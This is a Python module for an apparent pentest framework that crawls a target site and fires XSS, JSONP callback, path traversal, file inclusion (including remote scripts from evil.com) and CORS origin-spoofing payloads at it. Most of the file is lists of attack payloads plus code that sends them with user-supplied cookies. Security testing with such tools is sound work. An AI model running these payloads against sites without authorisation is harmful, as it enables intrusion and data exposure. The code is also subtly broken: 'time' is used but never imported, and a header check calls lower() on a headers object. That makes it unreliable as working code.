import requests
import urllib.parse
import re
from bs4 import BeautifulSoup
from modules.base import BaseModule

class XSSInclusionScanner(BaseModule):
    def __init__(self):
        super().__init__()
        self.description = "Cross-Site Script Inclusion (XSSI) vulnerability scanner"
        self.module_type = "exploit"
        self.options = {
            "URL": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CRAWL_DEPTH": "1",
            "TEST_CALLBACKS": True,
            "TEST_HTML_INJECTION": True,
            "TEST_JSONP": True,
            "TEST_FILE_INCLUSION": True,
            "TEST_CORS": True
        }
        self.required_options = ["URL"]
        
        self.xssi_payloads = [
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(document.domain)>",
            "<body onload=alert(document.domain)>",
            "<input onfocus=alert(document.domain) autofocus>",
            "<select onfocus=alert(document.domain) autofocus>",
            "<textarea onfocus=alert(document.domain) autofocus>",
            "<keygen onfocus=alert(document.domain) autofocus>",
            "<video/poster/onerror=alert(document.domain)>",
            "<audio src onloadstart=alert(document.domain)>",
            "<details ontoggle=alert(document.domain)>",
            "<marquee onstart=alert(document.domain)>",
            "'\"><script>alert(document.domain)</script>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "javascript:alert(document.domain)",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<scr<script>ipt>alert(document.domain)</scr</script>ipt>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))>",
            "<iframe src=javascript:alert(document.domain)>",
            "<link rel=import href=//evil.com/xss.html>",
            "<object data=javascript:alert(document.domain)>",
            "<isindex type=image src=1 onerror=alert(document.domain)>",
            "<form action=javascript:alert(document.domain)><input type=submit>",
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(document.domain);\">",
            "<script>\\x61\\x6c\\x65\\x72\\x74\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64\\x6f\\x6d\\x61\\x69\\x6e\\x29</script>",
            "<script>$('html').html('<img src=x onerror=alert(1)>')</script>",
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>"
        ]
        
        self.jsonp_payloads = [
            "callback=alert(document.domain)",
            "callback=eval(alert(document.domain))",
            "callback=(function(){alert(document.domain)})",
            "jsonp=alert(document.domain)",
            "jsonp=eval(alert(document.domain))",
            "jsonp=(function(){alert(document.domain)})",
            "cb=alert(document.domain)",
            "cb=eval(alert(document.domain))",
            "cb=(function(){alert(document.domain)})",
            "func=alert(document.domain)",
            "func=eval(alert(document.domain))",
            "func=(function(){alert(document.domain)})",
            "service=alert(document.domain)",
            "service=eval(alert(document.domain))",
            "service=(function(){alert(document.domain)})"
        ]
        
        self.file_inclusion_payloads = [
            "http://evil.com/xss.js",
            "//evil.com/xss.js",
            "https://evil.com/xss.js",
            "ftp://evil.com/xss.js",
            "data:text/javascript,alert(document.domain)",
            "data:text/html,<script>alert(document.domain)</script>",
            "file:///etc/passwd",
            "../../../../../../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//....//....//....//....//....//....//....//etc/passwd",
            "/etc/passwd%00",
            "c:\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\....\\....\\....\\....\\....\\....\\....\\windows\\win.ini%00"
        ]
        
        self.cors_payloads = [
            {"Origin": "null"},
            {"Origin": "http://evil.com"},
            {"Origin": "https://evil.com"},
            {"Origin": "http://evil.com:80"},
            {"Origin": "https://evil.com:443"},
            {"Referer": "http://evil.com"},
            {"Referer": "https://evil.com"}
        ]
        
        self.jsonp_callback_patterns = [
            "callback",
            "jsonp",
            "cb",
            "func",
            "service",
            "json",
            "api",
            "data",
            "response",
            "success",
            "complete",
            "done",
            "render",
            "display",
            "show",
            "load"
        ]
        
        self.sensitive_data_patterns = [
            "api_key",
            "apikey",
            "access_token",
            "accesstoken",
            "auth_token",
            "authtoken",
            "secret",
            "password",
            "pwd",
            "user",
            "username",
            "email",
            "session",
            "session_id",
            "sessionid",
            "token",
            "private",
            "secret_key",
            "secretkey",
            "auth",
            "authorization",
            "bearer"
        ]
    
    def run(self):
        url = self.get_option("URL")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        crawl_depth = int(self.get_option("CRAWL_DEPTH"))
        
        print(f"[*] Target URL: {url}")
        print(f"[*] Method: {method}")
        print(f"[*] Crawl Depth: {crawl_depth}")
        print(f"{'='*60}\n")
        
        vulnerabilities = []
        
        urls_to_test = [url]
        
        if crawl_depth > 0:
            urls_to_test.extend(self.crawl_urls(url, crawl_depth))
        
        for test_url in urls_to_test:
            print(f"[*] Testing URL: {test_url}")
            
            if self.get_option("TEST_CALLBACKS"):
                vulns = self.test_jsonp_callbacks(test_url, method, timeout, delay)
                vulnerabilities.extend(vulns)
            
            if self.get_option("TEST_HTML_INJECTION"):
                vulns = self.test_html_injection(test_url, method, timeout, delay)
                vulnerabilities.extend(vulns)
            
            if self.get_option("TEST_JSONP"):
                vulns = self.test_jsonp(test_url, method, timeout, delay)
                vulnerabilities.extend(vulns)
            
            if self.get_option("TEST_FILE_INCLUSION"):
                vulns = self.test_file_inclusion(test_url, method, timeout, delay)
                vulnerabilities.extend(vulns)
            
            if self.get_option("TEST_CORS"):
                vulns = self.test_cors(test_url, method, timeout, delay)
                vulnerabilities.extend(vulns)
        
        print(f"\n{'='*60}")
        
        if vulnerabilities:
            print(f"[!] Found {len(vulnerabilities)} potential XSSI vulnerabilities!\n")
            for vuln in vulnerabilities:
                print(f"  Type: {vuln['type']}")
                print(f"  URL: {vuln['url']}")
                print(f"  Payload: {vuln['payload']}\n")
            
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            print(f"[+] No XSSI vulnerabilities detected\n")
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def crawl_urls(self, url, depth):
        urls = []
        try:
            response = requests.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http'):
                    urls.append(href)
                elif href.startswith('/'):
                    base_url = '/'.join(url.split('/')[:3])
                    urls.append(base_url + href)
            
            if depth > 1:
                for new_url in urls[:5]:  # Limit to avoid too many requests
                    urls.extend(self.crawl_urls(new_url, depth - 1))
            
            return list(set(urls))  # Remove duplicates
        except:
            return []
    
    def test_jsonp_callbacks(self, url, method, timeout, delay):
        vulnerabilities = []
        headers = self.get_headers()
        cookies = self.get_cookies()
        
        try:
            response = requests.get(url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            content = response.text
            
            for pattern in self.jsonp_callback_patterns:
                if pattern in url.lower():
                    for payload in self.xssi_payloads[:5]:  # Test a subset of payloads
                        if delay > 0:
                            time.sleep(delay)
                        
                        test_url = url.replace(f"{pattern}=", f"{pattern}={payload}")
                        
                        try:
                            test_response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                            
                            if payload in test_response.text or "alert" in test_response.text.lower():
                                vulnerabilities.append({
                                    "type": "JSONP Callback Injection",
                                    "url": url,
                                    "payload": payload
                                })
                                break
                        except:
                            pass
                    break
        except:
            pass
        
        return vulnerabilities
    
    def test_html_injection(self, url, method, timeout, delay):
        vulnerabilities = []
        headers = self.get_headers()
        cookies = self.get_cookies()
        
        for payload in self.xssi_payloads:
            if delay > 0:
                time.sleep(delay)
            
            try:
                if method == "GET":
                    test_url = f"{url}?q={urllib.parse.quote(payload)}"
                    response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                else:
                    data = {"q": payload}
                    response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                
                if payload in response.text or "<script>alert(" in response.text.lower():
                    vulnerabilities.append({
                        "type": "HTML Injection",
                        "url": url,
                        "payload": payload
                    })
                    break
            except:
                pass
        
        return vulnerabilities
    
    def test_jsonp(self, url, method, timeout, delay):
        vulnerabilities = []
        headers = self.get_headers()
        cookies = self.get_cookies()
        
        for payload in self.jsonp_payloads:
            if delay > 0:
                time.sleep(delay)
            
            try:
                if method == "GET":
                    test_url = f"{url}?{payload}"
                    response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                else:
                    data = {}
                    for param in payload.split("="):
                        if param:
                            data[param] = "test"
                    response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                
                if "alert(" in response.text.lower() or "eval(" in response.text.lower():
                    vulnerabilities.append({
                        "type": "JSONP Injection",
                        "url": url,
                        "payload": payload
                    })
                    break
            except:
                pass
        
        return vulnerabilities
    
    def test_file_inclusion(self, url, method, timeout, delay):
        vulnerabilities = []
        headers = self.get_headers()
        cookies = self.get_cookies()
        
        for payload in self.file_inclusion_payloads:
            if delay > 0:
                time.sleep(delay)
            
            try:
                if method == "GET":
                    test_url = f"{url}?file={urllib.parse.quote(payload)}"
                    response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                else:
                    data = {"file": payload}
                    response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                
                if "root:" in response.text or "[boot loader]" in response.text.lower() or "alert(" in response.text.lower():
                    vulnerabilities.append({
                        "type": "File Inclusion",
                        "url": url,
                        "payload": payload
                    })
                    break
            except:
                pass
        
        return vulnerabilities
    
    def test_cors(self, url, method, timeout, delay):
        vulnerabilities = []
        
        for payload in self.cors_payloads:
            if delay > 0:
                time.sleep(delay)
            
            try:
                headers = self.get_headers()
                headers.update(payload)
                cookies = self.get_cookies()
                
                response = requests.get(url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
                
                if 'access-control-allow-origin' in response.headers.lower():
                    allowed_origin = response.headers['Access-Control-Allow-Origin']
                    if allowed_origin == "*" or allowed_origin in payload.values():
                        vulnerabilities.append({
                            "type": "CORS Misconfiguration",
                            "url": url,
                            "payload": str(payload)
                        })
                        break
            except:
                pass
        
        return vulnerabilities
    
    def get_headers(self):
        headers = {
            "User-Agent": self.get_option("USER_AGENT")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        return headers
    
    def get_cookies(self):
        cookies = {}
        
        if self.get_option("COOKIE"):
            try:
                for cookie in self.get_option("COOKIE").split(";"):
                    if "=" in cookie:
                        key, value = cookie.split("=", 1)
                        cookies[key.strip()] = value.strip()
            except:
                pass
        
        return cookies
